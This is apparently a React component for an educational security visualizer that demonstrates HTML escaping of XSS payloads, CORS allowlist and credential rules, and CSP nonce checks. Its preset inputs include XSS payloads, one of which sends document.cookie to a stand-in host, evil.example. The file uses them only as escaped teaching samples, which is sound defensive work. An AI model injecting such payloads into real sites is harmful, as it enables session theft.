import { useState } from 'react';
import { VisualizerFrame } from '@/components/visualizers/VisualizerFrame';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Switch } from '@/components/ui/switch';
import { useApp } from '@/contexts/AppContext';

function escapeHtmlSafe(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

export default function SecuritySandboxVisualizer() {
  const { locale } = useApp();
  const [xssInput, setXssInput] = useState('<img src=x onerror="alert(document.cookie)">');
  const [corsOrigin, setCorsOrigin] = useState('https://app.example');
  const [withCreds, setWithCreds] = useState(true);
  const [wildcardPolicy, setWildcardPolicy] = useState(false);

  const [cspNoncePresent, setCspNoncePresent] = useState(true);
  const [cspUnsafeInline, setCspUnsafeInline] = useState(false);

  const allowlist = ['https://app.example', 'https://admin.example'];
  const corsAllowed = wildcardPolicy
    ? !withCreds
    : allowlist.includes(corsOrigin);

  const inlineScriptAllowed = cspUnsafeInline || cspNoncePresent;

  return (
    <VisualizerFrame
      title={{ vi: 'Security Lab: XSS Escaping, CORS Preflight & CSP Rules', en: 'Security Lab: XSS Sanitization, CORS & CSP Inspector' }}
      description={{
        vi: 'Thử nghiệm an toàn payload XSS (luôn render dạng text escaped), kiểm tra hợp lệ CORS credentials + wildcard và luật CSP nonce.',
        en: 'Safely inspect escaped XSS payloads, test CORS wildcard-vs-credentials restrictions, and evaluate CSP script rules.',
      }}
      onReset={() => {
        setXssInput('<img src=x onerror="alert(document.cookie)">');
        setCorsOrigin('https://app.example');
        setWithCreds(true);
        setWildcardPolicy(false);
        setCspNoncePresent(true);
        setCspUnsafeInline(false);
      }}
    >
      <Tabs defaultValue="xss">
        <TabsList>
          <TabsTrigger value="xss">XSS Escaping</TabsTrigger>
          <TabsTrigger value="cors">CORS Rules</TabsTrigger>
          <TabsTrigger value="csp">CSP Nonce</TabsTrigger>
        </TabsList>

        <TabsContent value="xss" className="mt-3 space-y-3 text-xs">
          <div className="flex flex-wrap gap-1.5">
            <Button type="button" size="xs" variant="outline" onClick={() => setXssInput('<script>fetch("https://evil.example?c="+document.cookie)</script>')}>
              &lt;script&gt; payload
            </Button>
            <Button type="button" size="xs" variant="outline" onClick={() => setXssInput('<img src=x onerror="alert(1)">')}>
              &lt;img onerror&gt;
            </Button>
            <Button type="button" size="xs" variant="outline" onClick={() => setXssInput('<svg onload=alert(1)>')}>
              &lt;svg onload&gt;
            </Button>
          </div>
          <Input value={xssInput} onChange={(e) => setXssInput(e.target.value)} className="font-mono text-xs" />
          <div className="grid gap-3 sm:grid-cols-2">
            <div className="rounded-md border border-rose-500/40 bg-rose-500/5 p-3">
              <Badge variant="destructive" className="mb-1.5 text-[10px]">Unsafe Sink (`innerHTML`)</Badge>
              <div className="font-mono text-[11px] text-rose-300 break-words">
                Browser parses DOM tag &amp; executes event handler if passed unsanitized!
              </div>
            </div>
            <div className="rounded-md border border-emerald-500/40 bg-emerald-500/5 p-3">
              <Badge className="mb-1.5 bg-emerald-500/20 text-emerald-400 text-[10px]">Safe Text (`textContent` / Escaped)</Badge>
              <div className="font-mono text-[11px] break-all">{escapeHtmlSafe(xssInput)}</div>
            </div>
          </div>
        </TabsContent>

        <TabsContent value="cors" className="mt-3 space-y-3 text-xs">
          <div className="flex flex-wrap items-center gap-3">
            <Input value={corsOrigin} onChange={(e) => setCorsOrigin(e.target.value)} className="max-w-64 font-mono text-xs" />
            <label className="flex items-center gap-1.5">
              <Switch checked={withCreds} onCheckedChange={setWithCreds} />
              <span>credentials: "include"</span>
            </label>
            <label className="flex items-center gap-1.5">
              <Switch checked={wildcardPolicy} onCheckedChange={setWildcardPolicy} />
              <span>Allow-Origin: *</span>
            </label>
          </div>
          <div className="rounded-md border border-border bg-muted/20 p-3 font-mono">
            <div className="flex items-center justify-between">
              <span>Allowlist: {wildcardPolicy ? '*' : allowlist.join(', ')}</span>
              <Badge variant={corsAllowed ? 'default' : 'destructive'}>
                {corsAllowed ? 'CORS ALLOWED' : 'CORS BLOCKED'}
              </Badge>
            </div>
            <div className="mt-1.5 text-[11px] text-muted-foreground">
              {wildcardPolicy && withCreds
                ? 'Browser rejects Access-Control-Allow-Origin: * when credentials: "include" is enabled!'
                : corsAllowed
                  ? `Access-Control-Allow-Origin: ${wildcardPolicy ? '*' : corsOrigin} | Vary: Origin`
                  : 'Origin not present in strict server allowlist.'}
            </div>
          </div>
        </TabsContent>

        <TabsContent value="csp" className="mt-3 space-y-3 text-xs">
          <div className="flex flex-wrap gap-4">
            <label className="flex items-center gap-2">
              <Switch checked={cspNoncePresent} onCheckedChange={setCspNoncePresent} />
              <span>{locale === 'vi' ? 'Script mang `nonce="r4nd0m"` khớp' : 'Script has matching `nonce="r4nd0m"`'}</span>
            </label>
            <label className="flex items-center gap-2">
              <Switch checked={cspUnsafeInline} onCheckedChange={setCspUnsafeInline} />
              <span>Include `'unsafe-inline'`</span>
            </label>
          </div>
          <div className="rounded-md border border-border bg-muted/20 p-3 font-mono text-[11px] space-y-2">
            <div>
              Header: <code>script-src 'self' 'nonce-r4nd0m'{cspUnsafeInline ? " 'unsafe-inline'" : ''}; object-src 'none'; frame-ancestors 'none'</code>
            </div>
            <div className="flex items-center justify-between rounded border border-border bg-card p-2">
              <span>Legitimate script w/ nonce={String(cspNoncePresent)}</span>
              <Badge variant={inlineScriptAllowed ? 'default' : 'destructive'}>
                {inlineScriptAllowed ? 'EXECUTED' : 'BLOCKED BY CSP'}
              </Badge>
            </div>
            <div className="flex items-center justify-between rounded border border-border bg-card p-2">
              <span>Injected attacker &lt;script&gt; (no nonce)</span>
              <Badge variant={cspUnsafeInline ? 'destructive' : 'default'}>
                {cspUnsafeInline ? 'VULNERABLE (unsafe-inline!)' : 'BLOCKED SAFELY'}
              </Badge>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </VisualizerFrame>
  );
}
